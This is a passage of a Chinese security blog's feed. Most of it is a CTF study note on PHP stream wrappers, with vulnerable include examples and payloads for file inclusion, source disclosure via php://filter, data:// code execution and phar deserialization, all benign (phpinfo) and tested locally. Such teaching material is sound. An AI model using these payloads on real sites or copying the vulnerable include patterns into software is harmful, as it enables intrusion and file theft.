    <summary type="html">&lt;p&gt;一说到phpinfo页面，之前对它的印象总是停留在 仅仅是一个测试是否getshell的标志 而已。但后来看到它的次数多了之后，逐渐意识到其实不应该忽略它所承载的各种配置详情。有时候是某个服务的开启与关闭，有时候是用户允许访问的文件范围，有时候是日志的绝对路径……周大福有时也会直接给出phpinfo页面，明摆着要我们从这些眼花缭乱的配置信息中找到突破。总之，学会看phpinfo百利而无一害，一定是值得花写这篇笔记的时间的呢。&lt;/p&gt;
&lt;p&gt;这篇笔记将不定时更新&lt;/p&gt;
&lt;p&gt;&lt;del&gt;不更新才怪了 这才学多少哦 拉得一匹还好意思咕是吧&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="php" scheme="https://www.m0x01sery.com/tags/php/"/>
    
    <category term="log" scheme="https://www.m0x01sery.com/tags/log/"/>
    
  </entry>
  
  <entry>
    <title>php伪协议解析及适用场景总结</title>
    <link href="https://www.m0x01sery.com/2021/12/21/php-pseudo-protocol/"/>
    <id>https://www.m0x01sery.com/2021/12/21/php-pseudo-protocol/</id>
    <published>2021-12-20T16:00:00.000Z</published>
    <updated>2022-09-15T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>入坑以来，练习周大福的时候经常遇到php伪协议的考点。不管是考到数据过滤还是和其它函数配合读取信息，总是不能第一时间反应过来有个php伪协议可以帮忙解决问题。</p><p>写这篇笔记的目的便是粗略地回顾一下有关php伪协议的知识，同时再加深一些对它的印象和理解了。</p><p>希望自己以后不要再被这个考点麻住了的说</p><p><a href="https://www.bilibili.com/video/BV1XM4y1c7Jp"><del>大学期末赛高考 下一篇又得拖到什么时候哦（瘫</del></a></p><span id="more"></span><h1 id="食材准备"><a href="#食材准备" class="headerlink" title="食材准备"></a>食材准备</h1><p>所谓php伪协议，其实就是<a href="https://www.php.net/manual/zh/wrappers.php">php支持的协议和封装协议</a></p><p>支持的种类分为十二种：</p><p>file:// — 访问本地文件系统</p><p>http:// – https:// — 访问 HTTP(s) 网址</p><p>ftp:// – ftps:// — 访问 FTP(s) URLs</p><p>php:// — 访问各个输入/输出流（I/O streams）</p><p>zlib:// – bzip2:// – zip:// — 压缩流</p><p>data:// — 数据（RFC 2397）</p><p>glob:// — 查找匹配的文件路径模式</p><p>phar:// — PHP 归档</p><p>ssh2:// — Secure Shell 2</p><p>rar:// — RAR</p><p>ogg:// — 音频流</p><p>expect:// — 处理交互式的流</p><p>这里从练习考点出现的频率来看的话，我们先把重心放在 <strong>php:// file:// phar:// data:// glob://</strong> 这五个的用法上</p><p>不能说其它的就可以晾在一边一点也不去学了 只是从现阶段能花的学习时间来看，暂时不应该对它们投入太多时间成本。</p><h1 id="厨房交响"><a href="#厨房交响" class="headerlink" title="厨房交响"></a>厨房交响</h1><h2 id="php-filter-—-你吧来拿"><a href="#php-filter-—-你吧来拿" class="headerlink" title="php://filter — 你吧来拿"></a>php://filter — 你吧来拿</h2><p>可以说这是最常使用的一个伪协议，一般可以利用其造成文件源码泄露。</p><blockquote><p>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。</p><p>这对于一体式（all-in-one）的文件函数非常有用，例如<code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>。</p></blockquote><p>常用参数概览</p><blockquote><p>resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。</p><p>read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p><p>write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p></blockquote><p>常用过滤器</p><blockquote><p>convert.base64-encode &amp; convert.base64-decode</p><p>使用这两个过滤器等同于分别用<code>base64_encode()</code>和<code>base64_decode()</code>函数处理所有的流数据。</p></blockquote><h3 id="本地试吃"><a href="#本地试吃" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>此时index.php的同级目录下有个叫做test.txt的文件。</p><p>试图读取里面的信息</p><p><img src="/images/BUU/202112211700194.png"></p><p>不对啊，我明明往里面写了东西的呢</p><p>让我们用过滤器看看是怎么回事</p><p><img src="/images/BUU/202112211703524.png"></p><p>然后编回来</p><p><img src="/images/BUU/202112211711151.png"></p><p>这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，通过编码后则可以读取文件源码。</p><h2 id="php-input-—-这是替身攻击"><a href="#php-input-—-这是替身攻击" class="headerlink" title="php://input — 这是替身攻击"></a>php://input — 这是替身攻击</h2><blockquote><p><strong>php://input</strong>是个可以访问请求的原始数据的只读流。POST请求少的情况下，最好使用<strong>php://input</strong>来代替 <strong>$HTTP_RAW_POST_DATA</strong>（原生的POST数据），因为它不依赖于特定的<strong>php.ini</strong>指令，内存消耗更少。</p></blockquote><p>那既然都提到POST了，能不带GET玩嘛~</p><h3 id="本地试吃-1"><a href="#本地试吃-1" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php 典中典文件包含漏洞</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure><p>试图搞事</p><p><img src="/images/BUU/202112211942039.png"></p><p>搞事未遂 雀食 include的再怎么说也得是个文件名嘛</p><p><strong>替 身 觉 醒</strong></p><p><img src="/images/BUU/202112211952241.png"></p><p><strong>ohhhhhhhhhhhhhhhhhhhhhhhhhhhh</strong></p><p>这是什么情况呢……简直<strong>就像是include了一个写着phpinfo()的文件一样</strong>的说</p><p>某些情况下 绕过GET型传参的waf很好用。</p><p>要说更底层的细节的话，本蒟蒻雀食暂时也还没搞懂，正在往死里补，求暂时放过&gt;_&lt;</p><h2 id="file-—-让我访问你网站正不正常啊"><a href="#file-—-让我访问你网站正不正常啊" class="headerlink" title="file:// — 让我访问你网站正不正常啊"></a>file:// — 让我访问你网站正不正常啊</h2><p>通过<strong>file</strong>协议可以访问本地文件系统。</p><p>在浏览器地址栏输入<strong>file</strong>协议可像资源管理器一样读取本地文件。（毕竟还是 <strong>浏览</strong> 器嘛~</p><p><img src="/images/BUU/202112211522406.png"></p><p>在建立了远程连接的情况下再通过php函数配合<strong>file</strong>协议读取文件，就能做到服务端任意文件读取。</p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html"><strong>SSRF</strong></a>（服务端请求伪造，<strong>Server Side Request Forgery</strong>）常用手段。</p><h3 id="本地试吃-2"><a href="#本地试吃-2" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 梅开二度</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> payload</span><br><span class="line">?file=file:<span class="regexp">//</span>D:\phpStudy\PHPTutorial\WWW\l.txt</span><br></pre></td></tr></table></figure><p>网上的其它演示都可以打开相对路径的文件 我这设置改来改去还是只能访问绝对路径文件 怪</p><p><img src="/images/BUU/202112212116212.png"></p><h2 id="phar-—-有基佬开我裤链"><a href="#phar-—-有基佬开我裤链" class="headerlink" title="phar:// — 有基佬开我裤链"></a>phar:// — 有基佬开我裤链</h2><p><strong>phar</strong> (“Php ARchive”) 是php里类似于<strong>jar</strong>的一种打包文件</p><p>在周大福里经常作为反序列化考点出现。</p><p>此漏洞利用在Blackhat2018大会上首次提出（大佬们tql），利用这种方法可以在不使用<code>unserialize()</code>函数的情况下触发php反序列化漏洞。</p><h3 id="本地试吃-3"><a href="#本地试吃-3" class="headerlink" title="本地试吃"></a>本地试吃</h3><p>我们先试着创建一个phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p><p>现在我们服务器（127.0.0.1）上就有了一个phar文件。</p><p>phar文件中被压缩的文件的一些信息，其中<strong>meta-data</strong>部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</p><p>用<strong>010Editor</strong>打开，可以看到<strong>meta-data</strong>是以序列化的形式存储的</p><p><img src="/images/BUU/202112211610188.png"></p><p>那么有序列化数据必然会有反序列化操作，php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将<strong>meta-data</strong>进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/202112211623190.png"></p><p>只要将phar文件中的<strong>meta-data</strong>换成恶意代码，即可触发反序列化漏洞。</p><p><strong>一种经典周大福</strong></p><p>我称之为<strong>文件查看器</strong>型，通常是有一个上传文件点，一个文件包含点。上传点<strong>一般限制得很死</strong>，图片马什么的想都不要想。phar后缀只要没被限制，就可以先上传有恶意代码的phar文件，再利用文件包含点将其反序列化的同时触发恶意代码。</p><h2 id="data-—-皇军托我给您带个话"><a href="#data-—-皇军托我给您带个话" class="headerlink" title="data:// — 皇军托我给您带个话"></a>data:// — 皇军托我给您带个话</h2><p>一种数据流封装器，用来传递相应格式的数据。通常可以用来执行php代码。</p><p>data://协议必须在<strong>allow_url_fopen</strong>和<strong>allow_url_include</strong>双On才能使用。</p><h3 id="本地试吃-4"><a href="#本地试吃-4" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 帽子戏法</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// payload <span class="number">1</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain,%<span class="number">3</span>C%3Fphp+phpinfo%28%29%3B // 防止特殊字符如<span class="string">&#x27;&lt;&gt;&#x27;</span>解析出错进行一次urlencode()</span><br><span class="line"></span><br><span class="line">// payload <span class="number">2</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== <span class="regexp">//</span> base64同理</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/202112212011428.png"></p><h2 id="glob-—-我来了就是查寝来了"><a href="#glob-—-我来了就是查寝来了" class="headerlink" title="glob:// — 我来了就是查寝来了"></a>glob:// — 我来了就是查寝来了</h2><p>php中的<code>DirectoryIterator</code>类提供了一个用于查看文件系统目录内容的简单接口。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码实现了一个简单的文件查看器的功能。</p><p><img src="/images/BUU/202112262150620.png"></p><p>glob协议可以借此查找匹配的文件路径，更精确地查找文件。</p><p><img src="/images/BUU/202112262157376.png"></p><p>此文章发布于2021.12.21，更新于2022.9.16。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;入坑以来，练习周大福的时候经常遇到php伪协议的考点。不管是考到数据过滤还是和其它函数配合读取信息，总是不能第一时间反应过来有个php伪协议可以帮忙解决问题。&lt;/p&gt;
&lt;p&gt;写这篇笔记的目的便是粗略地回顾一下有关php伪协议的知识，同时再加深一些对它的印象和理解了。&lt;/p&gt;
&lt;p&gt;希望自己以后不要再被这个考点麻住了的说&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1XM4y1c7Jp&quot;&gt;&lt;del&gt;大学期末赛高考 下一篇又得拖到什么时候哦（瘫&lt;/del&gt;&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="web" scheme="https://www.m0x01sery.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>php伪协议解析及适用场景总结</title>
    <link href="https://www.m0x01sery.com/2021/12/21/pwn/"/>
    <id>https://www.m0x01sery.com/2021/12/21/pwn/</id>
    <published>2021-12-20T16:00:00.000Z</published>
    <updated>2022-09-15T16:00:00.000Z</updated>
    
    
    
    
    
    <category term="pwn" scheme="https://www.m0x01sery.com/tags/pwn/"/>
    
  </entry>
  
</feed>
